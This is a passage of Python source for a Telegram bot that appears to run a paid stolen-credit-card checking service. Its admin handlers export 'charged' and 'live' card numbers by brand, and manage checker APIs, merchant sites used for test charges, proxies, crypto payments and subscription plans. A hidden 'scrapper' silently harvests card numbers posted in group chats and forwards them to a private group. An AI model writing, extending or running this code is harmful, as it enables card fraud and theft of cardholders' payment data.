        f"━━━━━━━━━━━━━━━━━━━━</blockquote>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn("All Hits (.txt)", icon="check", color="success",
              callback_data="export:type:all")],
        [pbtn("Charged Only", icon="gem", color="success",
              callback_data="export:type:charged"),
         pbtn("Live Cards", icon="online", color="primary",
              callback_data="export:type:live")],
        [pbtn("Visa", icon="gem", color="primary",
              callback_data="export:type:visa"),
         pbtn("MasterCard", icon="gem2", color="primary",
              callback_data="export:type:master"),
         pbtn("Amex", icon="gem3", color="primary",
              callback_data="export:type:amex")],
        [pbtn("Back", icon="back", color="primary", callback_data="admin:main")],
    ])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data.startswith("export:type:"))
async def cb_export_cards(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    export_type = cb.data.split(":")[2]
    await cb.answer("Generating...")
    query = "SELECT cc, response FROM charged_hits"
    if export_type == "charged":
        query += " WHERE response LIKE '%CHARGED%' OR response LIKE '%ORDER%'"
    elif export_type == "live":
        query += " WHERE response LIKE '%INSUFFICIENT%' OR response LIKE '%NSF%' OR response LIKE '%CCN%' OR response LIKE '%3DS%'"
    elif export_type == "visa":
        query += " WHERE cc LIKE '4%'"
    elif export_type == "master":
        query += " WHERE cc LIKE '5%'"
    elif export_type == "amex":
        query += " WHERE cc LIKE '34%' OR cc LIKE '37%'"
    with db() as c:
        rows = c.execute(query + " ORDER BY id").fetchall()
    if not rows:
        return await cb.answer("No cards for this filter", show_alert=True)
    lines = []
    for r in rows:
        cc = r["cc"]
        resp = r["response"].upper()
        if cc.startswith('4'): brand = "VISA"
        elif cc.startswith('5'): brand = "MASTER"
        elif cc.startswith(('34', '37')): brand = "AMEX"
        elif cc.startswith('6'): brand = "DISCOVER"
        else: brand = "UNKNOWN"
        lines.append(f"{cc} | {brand} | {resp}")
    data = "\n".join(lines).encode("utf-8")
    fname = f"export_{export_type}_{datetime.now().strftime('%H%M%S')}.txt"
    try:
        await cb.message.answer_document(
            BufferedInputFile(data, filename=fname),
            caption=f"✅ <b>Exported {len(rows)} cards</b>\n"
                    f"<blockquote>Filter: {export_type.upper()}</blockquote>",
            parse_mode="HTML")
    except Exception as e:
        await cb.answer(f"Failed: {e}", show_alert=True)

# ── APIs manager ──────────────────────────────────────────────────────────
@router.callback_query(F.data == "admin:apis")
async def cb_admin_apis(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    sl_count = len(get_siteless_apis())
    ws_count = len(get_withsite_apis())
    old_count = len(load_api_state().get("endpoints", []))
    cur_mode = get_setting("site_mode", "auto")
    text = (
        f"{pe('link')} <b>{sc('API Manager')}</b>\n"
        f"<blockquote>{pe('diamond')} {sc('Mode')}: <b>{cur_mode.upper()}</b>\n"
        f"{pe('star')} {sc('Siteless APIs')}: <b>{sl_count}</b>\n"
        f"{pe('shop')} {sc('With-Site APIs')}: <b>{ws_count}</b>\n"
        f"{pe('docs')} {sc('Legacy APIs')}: <b>{old_count}</b></blockquote>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn(sc("Siteless APIs"), icon="gem", color="success",
              callback_data="admin:api_sl"),
         pbtn(sc("With-Site APIs"), icon="shop", color="primary",
              callback_data="admin:api_ws")],
        [pbtn(sc("Mode: Siteless"), icon="refresh", color="primary",
              callback_data="admin:set_mode:siteless"),
         pbtn(sc("Mode: With-Site"), icon="refresh", color="primary",
              callback_data="admin:set_mode:with_site")],
        [pbtn(sc("Mode: Auto"), icon="refresh", color="success",
              callback_data="admin:set_mode:auto")],
        [pbtn(sc("Add Legacy API"), icon="add", color="primary",
              callback_data="admin:api_add"),
         pbtn(sc("Clear Legacy"), icon="trash", color="danger",
              callback_data="admin:api_clear")],
        [pbtn(sc("Back"), icon="back", color="primary", callback_data="admin:main")],
    ])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data.startswith("admin:set_mode:"))
async def cb_set_mode(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    mode = cb.data.split(":")[2]
    set_setting("site_mode", mode)
    await cb.answer(f"Mode: {mode.upper()}", show_alert=True)
    await cb_admin_apis(cb)

@router.callback_query(F.data == "admin:api_sl")
async def cb_api_sl(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    apis = get_siteless_apis()
    text = (
        f"{pe('gem')} <b>{sc('Siteless APIs')} ({len(apis)})</b>\n"
        f"<blockquote>"
        + ("\n".join(f"{pe('check')} <code>{esc(a['endpoint'][:60])}</code>" for a in apis[:10])
           if apis else sc("None added"))
        + "</blockquote>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn(sc("Add"), icon="add", color="success",
              callback_data="admin:api_sl_add"),
         pbtn(sc("Clear All"), icon="trash", color="danger",
              callback_data="admin:api_sl_clear")],
        [pbtn(sc("Back"), icon="back", color="primary", callback_data="admin:apis")],
    ])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data == "admin:api_sl_add")
async def cb_api_sl_add(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_api_sl_add")
    await edit_admin(
        cb,
        f"{pe('add')} <b>{sc('Add Siteless API')}</b>\n"
        f"<blockquote>{pe('pen')} {sc('Send endpoint URL(s)')}:\n"
        f"<code>http://host:port/</code>\n<i>(multiple lines for bulk)</i></blockquote>",
        InlineKeyboardMarkup(inline_keyboard=[[
            pbtn(sc("Back"), icon="back", color="primary", callback_data="admin:api_sl")
        ]]))
    await cb.answer()

@router.callback_query(F.data == "admin:api_sl_clear")
async def cb_api_sl_clear(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c: c.execute("DELETE FROM api_siteless")
    await cb.answer("Cleared!", show_alert=True)
    await cb_api_sl(cb)

@router.callback_query(F.data == "admin:api_ws")
async def cb_api_ws(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    apis = get_withsite_apis()
    text = (
        f"{pe('shop')} <b>{sc('With-Site APIs')} ({len(apis)})</b>\n"
        f"<blockquote>"
        + ("\n".join(f"{pe('check')} <code>{esc(a['endpoint'][:60])}</code>" for a in apis[:10])
           if apis else sc("None added"))
        + "</blockquote>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn(sc("Add"), icon="add", color="success",
              callback_data="admin:api_ws_add"),
         pbtn(sc("Clear All"), icon="trash", color="danger",
              callback_data="admin:api_ws_clear")],
        [pbtn(sc("Back"), icon="back", color="primary", callback_data="admin:apis")],
    ])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data == "admin:api_ws_add")
async def cb_api_ws_add(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_api_ws_add")
    await edit_admin(
        cb,
        f"{pe('add')} <b>{sc('Add With-Site API')}</b>\n"
        f"<blockquote>{pe('pen')} {sc('Send endpoint URL(s)')}:\n"
        f"<code>http://host:port/shopii</code></blockquote>",
        InlineKeyboardMarkup(inline_keyboard=[[
            pbtn(sc("Back"), icon="back", color="primary", callback_data="admin:api_ws")
        ]]))
    await cb.answer()

@router.callback_query(F.data == "admin:api_ws_clear")
async def cb_api_ws_clear(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c: c.execute("DELETE FROM api_withsite")
    await cb.answer("Cleared!", show_alert=True)
    await cb_api_ws(cb)

@router.callback_query(F.data == "admin:api_add")
async def cb_admin_api_add(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_api_add")
    await edit_admin(cb, f"{pe('add')} <b>Add Legacy API</b>\n"
                         f"<blockquote>Send: <code>http://host:port/path</code></blockquote>",
                     back_kb())
    await cb.answer()

@router.callback_query(F.data == "admin:api_clear")
async def cb_admin_api_clear(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    st = load_api_state(); st["endpoints"] = []; save_api_state(st)
    await cb.answer("Cleared!", show_alert=True)
    await cb_admin_apis(cb)

# ── Sites manager ─────────────────────────────────────────────────────────
@router.callback_query(F.data == "admin:sites")
async def cb_admin_sites(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c: total = c.execute("SELECT COUNT(*) as n FROM sites").fetchone()["n"]
    max_p = get_setting("site_max_price", "6.0")
    ws_count = len(get_withsite_apis())
    text = (
        f"{pe('shop')} <b>{sc('Sites Manager')}</b>\n"
        f"<blockquote>{pe('diamond')} {sc('Sites in DB')}: <b>{total}</b>\n"
        f"{pe('gem')} {sc('Max Price')}: <b>${max_p}</b>\n"
        f"{pe('link')} {sc('With-Site APIs')}: <b>{ws_count}</b>"
        f"{' ⚠️' if ws_count == 0 else ''}</blockquote>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn(sc("Add & Check Sites"), icon="add", color="success",
              callback_data="admin:sites_add"),
         pbtn(sc("Admin Checker"), icon="shop", color="primary",
              callback_data="admin:site_chkr")],
        [pbtn(sc(f"Max: ${max_p}"), icon="gem", color="primary",
              callback_data="admin:set_max_price"),
         pbtn(sc("List Sites"), icon="docs", color="primary",
              callback_data="admin:sites_list")],
        [pbtn(sc("Export .txt"), icon="docs", color="primary",
              callback_data="admin:sites_export"),
         pbtn(sc("Clear All"), icon="trash", color="danger",
              callback_data="admin:sites_clear")],
        [pbtn(sc("Back"), icon="back", color="primary", callback_data="admin:main")],
    ])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data == "admin:set_max_price")
async def cb_set_max_price(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    cur = get_setting("site_max_price", "6.0")
    set_awaiting(cb.from_user.id, "set_setting:site_max_price")
    await edit_admin(
        cb,
        f"{pe('gem')} <b>{sc('Set Max Site Price')}</b>\n"
        f"<blockquote>{pe('docs')} Current: <b>${cur}</b>\n"
        f"{pe('pen')} Send new max price:</blockquote>",
        InlineKeyboardMarkup(inline_keyboard=[[
            pbtn(sc("Back"), icon="back", color="primary", callback_data="admin:sites")
        ]]))
    await cb.answer()

@router.callback_query(F.data == "admin:sites_list")
async def cb_admin_sites_list(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c:
        rows = c.execute("SELECT url FROM sites ORDER BY id DESC LIMIT 30").fetchall()
    if not rows:
        return await cb.answer("No sites in DB", show_alert=True)
    lines = [f"{pe('shop')} <b>{sc('Sites')} ({len(rows)})</b>\n<blockquote>"]
    for r in rows:
        lines.append(f"{pe('check')} <code>{esc(r['url'])}</code>")
    lines.append("</blockquote>")
    await edit_admin(cb, "\n".join(lines), InlineKeyboardMarkup(inline_keyboard=[[
        pbtn(sc("Back"), icon="back", color="primary", callback_data="admin:sites")
    ]]))
    await cb.answer()

@router.callback_query(F.data == "admin:sites_export")
async def cb_admin_sites_export(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    await cb.answer("Exporting...")
    with db() as c:
        rows = c.execute("SELECT url FROM sites ORDER BY id").fetchall()
    if not rows:
        return await cb.message.answer(f"{pe('warn')} No sites", parse_mode="HTML")
    data = "\n".join(r["url"] for r in rows)
    fname = f"sites_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    await cb.message.answer_document(
        BufferedInputFile(data.encode(), filename=fname),
        caption=f"{pe('docs')} <b>{len(rows)} sites</b>",
        parse_mode="HTML")

@router.callback_query(F.data == "admin:sites_add")
async def cb_admin_sites_add(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_sites_add")
    max_p = get_setting("site_max_price", "6.0")
    await edit_admin(
        cb,
        f"{pe('add')} <b>{sc('Add & Check Sites')}</b>\n"
        f"<blockquote>{pe('pen')} {sc('Paste sites — one per line')}\n"
        f"{pe('gem')} Max price: <b>${max_p}</b></blockquote>",
        InlineKeyboardMarkup(inline_keyboard=[[
            pbtn(sc("Back"), icon="back", color="primary", callback_data="admin:sites")
        ]]))
    await cb.answer()

@router.callback_query(F.data == "admin:sites_clear")
async def cb_admin_sites_clear(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c: c.execute("DELETE FROM sites")
    _invalidate_sites()
    await cb.answer("Cleared!", show_alert=True)
    await cb_admin_sites(cb)

@router.callback_query(F.data == "admin:site_chkr")
async def cb_admin_site_chkr(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_site_chkr")
    await edit_admin(
        cb,
        f"{pe('shop')} <b>{sc('Site Checker (Admin)')}</b>\n"
        f"<blockquote>{pe('pen')} {sc('Paste sites — one per line')}\n"
        f"<i>Results NOT saved</i></blockquote>",
        InlineKeyboardMarkup(inline_keyboard=[[
            pbtn(sc("Back"), icon="back", color="primary", callback_data="admin:sites")
        ]]))
    await cb.answer()

# ── Force channels ────────────────────────────────────────────────────────
@router.callback_query(F.data == "admin:force_list")
async def cb_admin_force(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    channels = force_channels_list()
    text = f"{pe('unlock')} <b>[=] Force Channels</b>\n<blockquote>"
    for ch in channels:
        text += f"• {ch['title']} ({ch['chat_id']}) - {'ON' if ch['enabled'] else 'OFF'}\n"
    if not channels: text += "No channels added."
    text += "</blockquote>"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn("Add Channel", icon="add", color="success",
              callback_data="admin:force_add")],
        [pbtn("Back", icon="back", color="primary", callback_data="admin:main")],
    ])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data == "admin:force_add")
async def cb_admin_force_add(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_force_add")
    await edit_admin(
        cb,
        f"{pe('add')} <b>Add Force Channel</b>\n"
        f"<blockquote>Forward from channel OR send @username</blockquote>",
        back_kb())
    await cb.answer()

# ── Scrapper GCs ──────────────────────────────────────────────────────────
@router.callback_query(F.data == "admin:scrapper_mgr")
async def cb_admin_scrapper(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c:
        gcs = c.execute("SELECT * FROM scrapper_gcs").fetchall()
    enabled = get_setting("scrapper_enabled", "1") == "1"
    text = (
        f"{pe('ghost')} <b>{sc('Secret Scrapper')}</b> · {'ON' if enabled else 'OFF'}\n"
        f"<blockquote>{pe('docs')} GCs: <b>{len(gcs)}</b>\n"
        + ("\n".join(f"{pe('check')} {esc(g['title'] or g['chat_id'])}" for g in gcs[:10])
           if gcs else f"{pe('warn')} None")
        + "</blockquote>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn(sc("Add GC"), icon="add", color="success",
              callback_data="admin:scrapper_add"),
         pbtn(sc("Clear"), icon="trash", color="danger",
              callback_data="admin:scrapper_clear")],
        [pbtn(f"{'Disable' if enabled else 'Enable'}",
              icon="refresh", color="primary",
              callback_data="admin:scrapper_toggle")],
        [pbtn(sc("Back"), icon="back", color="primary", callback_data="admin:bot_settings")],
    ])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data == "admin:scrapper_add")
async def cb_scrapper_add(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_scrapper_add")
    await edit_admin(
        cb,
        f"{pe('add')} <b>{sc('Add Scrapper GC')}</b>\n"
        f"<blockquote>Send GC chat ID or forward a message</blockquote>",
        InlineKeyboardMarkup(inline_keyboard=[[
            pbtn(sc("Back"), icon="back", color="primary", callback_data="admin:scrapper_mgr")
        ]]))
    await cb.answer()

@router.callback_query(F.data == "admin:scrapper_clear")
async def cb_scrapper_clear(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c: c.execute("DELETE FROM scrapper_gcs")
    await cb.answer("Cleared", show_alert=True)
    await cb_admin_scrapper(cb)

@router.callback_query(F.data == "admin:scrapper_toggle")
async def cb_scrapper_toggle(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    new = "0" if get_setting("scrapper_enabled", "1") == "1" else "1"
    set_setting("scrapper_enabled", new)
    await cb.answer(f"Scrapper {'ON' if new == '1' else 'OFF'}")
    await cb_admin_scrapper(cb)

# ── Other admin callbacks ─────────────────────────────────────────────────
@router.callback_query(F.data == "admin:toggle_maint")
async def cb_admin_toggle_maint(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    new = "1" if get_setting("maintenance") == "0" else "0"
    set_setting("maintenance", new)
    await cb.answer(f"Maint: {'ON' if new == '1' else 'OFF'}")
    await cb_admin_main(cb)

@router.callback_query(F.data == "admin:clear_cache")
async def cb_admin_clear_cache(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    _invalidate_sites()
    _dead_proxies_run.clear()
    _scrapper_seen.clear()
    with db() as c: c.execute("DELETE FROM bin_cache")
    await cb.answer("Cache cleared!", show_alert=True)
    await cb_admin_main(cb)

@router.callback_query(F.data == "admin:backup_now")
async def cb_admin_backup(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    await cb.answer("Generating backup...", show_alert=False)
    await send_backup(cb.from_user.id)

@router.callback_query(F.data == "admin:restore_db")
async def cb_admin_restore(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "restore_backup")
    await edit_admin(
        cb,
        f"{pe('refresh')} <b>Restore DB</b>\n"
        f"<blockquote>Send <code>.sql</code> or <code>.sql.gz</code> backup file</blockquote>",
        back_kb())
    await cb.answer()

@router.callback_query(F.data == "admin:plans_mgr")
async def cb_admin_plans(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    text = f"{pe('gem')} <b>[=] Pricing & Plans</b>\n<blockquote>Change prices here.</blockquote>"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn("Weekly Price", icon="pen", color="success",
              callback_data="admin:edit_price:weekly")],
        [pbtn("Monthly Price", icon="pen", color="success",
              callback_data="admin:edit_price:monthly")],
        [pbtn("Back", icon="back", color="primary", callback_data="admin:main")],
    ])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data.startswith("admin:edit_price:"))
async def cb_edit_price(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    plan = cb.data.split(":")[2]
    set_awaiting(cb.from_user.id, f"edit_price:{plan}")
    await edit_admin(cb, f"{pe('pen')} Send new price for <b>{plan.title()}</b>:",
                     back_kb())
    await cb.answer()

@router.callback_query(F.data == "admin:trial_setup")
async def cb_trial_setup(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    text = (f"{pe('star')} <b>[=] Free Trial</b>\n"
            f"<blockquote>Duration: <b>{get_setting('trial_hours', '3')} Hours</b></blockquote>")
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn("Change Duration", icon="pen", color="success",
              callback_data="admin:edit_trial")],
        [pbtn("Back", icon="back", color="primary", callback_data="admin:main")],
    ])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data == "admin:edit_trial")
async def cb_edit_trial(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "edit_trial")
    await edit_admin(cb, f"{pe('pen')} Send trial duration in hours:", back_kb())
    await cb.answer()

@router.callback_query(F.data == "admin:wallet_setup")
async def cb_wallet_setup(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    text = (f"{pe('gem')} <b>[=] Crypto Wallets</b>\n"
            f"<blockquote>USDT: <code>{get_setting('wallet_usdt', 'Not Set')}</code>\n"
            f"TON: <code>{get_setting('wallet_ton', 'Not Set')}</code></blockquote>")
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn("Set USDT", icon="pen", color="success",
              callback_data="admin:set_wallet:wallet_usdt")],
        [pbtn("Set TON", icon="pen", color="success",
              callback_data="admin:set_wallet:wallet_ton")],
        [pbtn("Back", icon="back", color="primary", callback_data="admin:main")],
    ])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data.startswith("admin:set_wallet:"))
async def cb_set_wallet(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    key = cb.data.split(":")[2]
    set_awaiting(cb.from_user.id, f"set_setting:{key}")
    await edit_admin(cb, f"{pe('pen')} Send new address for <b>{key}</b>:", back_kb())
    await cb.answer()

@router.callback_query(F.data == "admin:proxy_mgr")
async def cb_admin_proxy_mgr(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c:
        total = c.execute("SELECT COUNT(*) as n FROM user_proxies").fetchone()["n"]
        live = c.execute("SELECT COUNT(*) as n FROM user_proxies WHERE status='live'").fetchone()["n"]
    text = (f"{pe('link')} <b>[=] Global Proxies</b>\n"
            f"<blockquote>Total: <b>{total}</b>\nLive: <b>{live}</b></blockquote>")
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn("Clear Dead", icon="trash", color="danger",
              callback_data="admin:clear_dead_proxies")],
        [pbtn("Back", icon="back", color="primary", callback_data="admin:main")],
    ])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data == "admin:clear_dead_proxies")
async def cb_clear_dead_proxies(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c: c.execute("DELETE FROM user_proxies WHERE status='dead'")
    await cb.answer("Cleared", show_alert=True)
    await cb_admin_proxy_mgr(cb)

@router.callback_query(F.data == "admin:promos")
async def cb_admin_promos(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c:
        total = c.execute("SELECT COUNT(*) as n FROM redeem_codes").fetchone()["n"]
    text = (f"{pe('add')} <b>[=] Promo Codes</b>\n"
            f"<blockquote>Total: <b>{total}</b></blockquote>")
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn("Generate Code", icon="add", color="success",
              callback_data="admin:gen_code")],
        [pbtn("Back", icon="back", color="primary", callback_data="admin:main")],
    ])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data == "admin:gen_code")
async def cb_admin_gen_code(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_gen_code")
    await edit_admin(
        cb,
        f"{pe('gem')} Send: <code>[plan] [uses] [days]</code>\n"
        f"{pe('pen')} Example: <code>premium 5 30</code>",
        InlineKeyboardMarkup(inline_keyboard=[[
            pbtn(sc("Back"), icon="back", color="primary", callback_data="admin:main")
        ]]))
    await cb.answer()

@router.callback_query(F.data == "admin:broadcast")
async def cb_admin_bc(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn("All Users", icon="user", color="primary",
              callback_data="admin:bc_all")],
        [pbtn("Premium Only", icon="gem", color="success",
              callback_data="admin:bc_premium")],
        [pbtn("Back", icon="back", color="primary", callback_data="admin:main")],
    ])
    await edit_admin(cb, f"{pe('bell')} <b>{sc('Broadcast')}</b>\n"
                         f"<blockquote>Select audience</blockquote>", kb)
    await cb.answer()

@router.callback_query(F.data.startswith("admin:bc_"))
async def cb_admin_bc_target(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return
    target = cb.data.split("_")[1]
    set_awaiting(cb.from_user.id, f"admin_broadcast:{target}")
    await edit_admin(
        cb,
        f"{pe('bell')} <b>{sc('Send broadcast')}</b>\n"
        f"<blockquote>Text or photo with caption</blockquote>",
        InlineKeyboardMarkup(inline_keyboard=[[
            pbtn(sc("Back"), icon="back", color="primary", callback_data="admin:main")
        ]]))
    await cb.answer()

@router.callback_query(F.data == "admin:manage_admins")
async def cb_manage_admins(cb: CallbackQuery):
    if cb.from_user.id not in (OWNER_ID, OWNER_ID2):
        return await cb.answer("Owner only!", show_alert=True)
    text = "👑 <b>Admin Management</b>\n\n<b>Full Admins:</b>\n"
    for a in ADMIN_IDS:
        text += f"• <code>{a}</code>\n"
    text += "\n<b>Moderators:</b>\n"
    for a in LIMITED_ADMIN_IDS:
        text += f"• <code>{a}</code>\n"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn("Add Full Admin", icon="add", color="success",
              callback_data="admin:add_admin")],
        [pbtn("Add Moderator", icon="add", color="success",
              callback_data="admin:add_ltd_admin")],
        [pbtn("Back", icon="back", color="primary", callback_data="admin:main")],
    ])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data == "admin:add_admin")
async def cb_admin_add_admin(cb: CallbackQuery):
    if cb.from_user.id not in (OWNER_ID, OWNER_ID2): return
    set_awaiting(cb.from_user.id, "admin_add_admin")
    await edit_admin(cb, f"{pe('add')} Send UID to add as admin:", back_kb())
    await cb.answer()

@router.callback_query(F.data == "admin:add_ltd_admin")
async def cb_admin_add_ltd_admin(cb: CallbackQuery):
    if cb.from_user.id not in (OWNER_ID, OWNER_ID2): return
    set_awaiting(cb.from_user.id, "admin_add_ltd_admin")
    await edit_admin(cb, f"{pe('add')} Send UID to add as moderator:", back_kb())
    await cb.answer()

# ═══════════════════════════════════════════════════════════════════════════
# TEXT / PHOTO / DOCUMENT HANDLERS (awaiting state dispatcher)
# ═══════════════════════════════════════════════════════════════════════════

_scrapper_seen: set = set()

async def _silent_scrap_message(msg: Message):
    """Extract CCs from scrapper GCs silently."""
    try:
        if get_setting("scrapper_enabled", "1") != "1": return
        with db() as c:
            is_scrap_gc = c.execute("SELECT id FROM scrapper_gcs WHERE chat_id=?",
                                    (str(msg.chat.id),)).fetchone()
        if not is_scrap_gc: return
        raw = msg.text or msg.caption or ""
        if not raw: return
        found = []
        for tok in re.split(r"[\s,;\n\r]+", raw):
            n = normalize_cc(tok)
            if n and n not in _scrapper_seen:
                _scrapper_seen.add(n); found.append(n)
                async with _get_write_lock():
                    with db() as c:
                        try:
                            c.execute("INSERT OR IGNORE INTO saved_cards(uid, cc, saved_at) "
                                      "VALUES(?,?,?)",
                                      (OWNER_ID, n,
                                       datetime.now(timezone.utc).isoformat()))
                        except: pass
        if found and _bot_ref:
            pvt_gc = get_setting("pvt_cc_gc_id")
            if pvt_gc:
                try:
                    chat_id = int(pvt_gc) if pvt_gc.lstrip("-").isdigit() else pvt_gc
                    text = (f"[SCRAPPED from {esc(msg.chat.title or str(msg.chat.id))}]\n"
                            + "\n".join(f"<code>{c}</code>" for c in found[:20]))
                    await _bot_ref.send_message(chat_id, text, parse_mode="HTML")
                except: pass
    except: pass

@router.message(F.text)
async def handle_text(msg: Message):
    if msg.text and msg.text.startswith("/"): return
    uid = msg.from_user.id
    awaiting = get_awaiting(uid)
    ensure_user(uid, msg.from_user.username or "")

    # Silent scrapper in groups
    if msg.chat.type in ("group", "supergroup"):
        asyncio.create_task(_silent_scrap_message(msg))
        return

    v = msg.text.strip()

    # ── User awaiting handlers ────────────────────────────────
    if awaiting == "add_proxy":
        set_awaiting(uid, '')
        parsed = parse_proxy_txt(msg.text)
        if not parsed:
            return await msg.answer(f"{pe('cross1')} <b>{sc('No valid proxies')}</b>",
                                    parse_mode="HTML", reply_markup=proxy_kb(uid))
        st = await msg.answer(f"{pe('loading')} <b>{sc('Testing')} {len(parsed)} "
                              f"{sc('proxies')}...</b>", parse_mode="HTML")
        result = await add_proxies_bulk(uid, parsed)
        await st.edit_text(
            f"{pe('check')} <b>{sc('Proxy Add Complete')}</b>\n"
            f"<blockquote>{pe('add')} Parsed: <b>{result['total_parsed']}</b>\n"
            f"{pe('check')} Live: <b>{result['live']}</b>\n"
            f"{pe('cross2')} Dead: <b>{result['dead']}</b></blockquote>",
            parse_mode="HTML", reply_markup=proxy_kb(uid))
        return

    if awaiting == "gift_credits":
        set_awaiting(uid, '')
        parts = msg.text.split(maxsplit=1)
        if len(parts) != 2 or not parts[1].isdigit():
            return await msg.answer(f"{pe('cross1')} <b>{sc('Invalid format')}</b>",
                                    parse_mode="HTML")
        target, amount = parts[0], int(parts[1])
        if amount < 10:
            return await msg.answer(f"{pe('cross1')} <b>{sc('Min 10 credits')}</b>",
                                    parse_mode="HTML")
        with db() as c:
            u = c.execute("SELECT credits FROM users WHERE uid=?", (uid,)).fetchone()
            if not u or u["credits"] < amount:
                return await msg.answer(f"{pe('cross1')} <b>{sc('Not enough')}</b>",
                                        parse_mode="HTML")
            t = c.execute("SELECT uid FROM users WHERE username=?",
                          (target.lstrip("@"),)).fetchone()
            if not t:
                return await msg.answer(f"{pe('cross1')} <b>{sc('User not found')}</b>",
                                        parse_mode="HTML")
            c.execute("UPDATE users SET credits=credits-? WHERE uid=?", (amount, uid))
            c.execute("UPDATE users SET credits=credits+? WHERE uid=?", (amount, t["uid"]))
        await msg.answer(f"{pe('check')} <b>{sc('Gifted')} {amount} {sc('credits to')} {target}</b>",
                         parse_mode="HTML")
        try:
            await _bot_ref.send_message(
                t["uid"],
                f"{pe('gem')} You received {amount} credits from @{msg.from_user.username or uid}!",
                parse_mode="HTML")
        except: pass
        return

    if awaiting and awaiting.startswith("fb_reply:"):
        set_awaiting(uid, '')
        parts = awaiting.split(":")
        fid, target_uid = parts[1], int(parts[2])
        reply_text = (f"{pe('chat')} <b>{sc('Admin Reply')} (#{fid})</b>\n"
                      f"<blockquote>{esc(msg.text[:800])}</blockquote>")
        try: await msg.bot.send_message(target_uid, reply_text, parse_mode="HTML")
        except: pass
        await msg.answer(f"{pe('check')} <b>{sc('Reply sent')}</b>", parse_mode="HTML")
        return

    if awaiting and awaiting.startswith("iadmin_reply:"):
        set_awaiting(uid, '')
        target_uid = int(awaiting.split(":")[1])
        reply_text = (f"{pe('chat')} <b>{sc('Admin Reply')}</b>\n"
                      f"<blockquote>{esc(msg.text[:800])}</blockquote>")
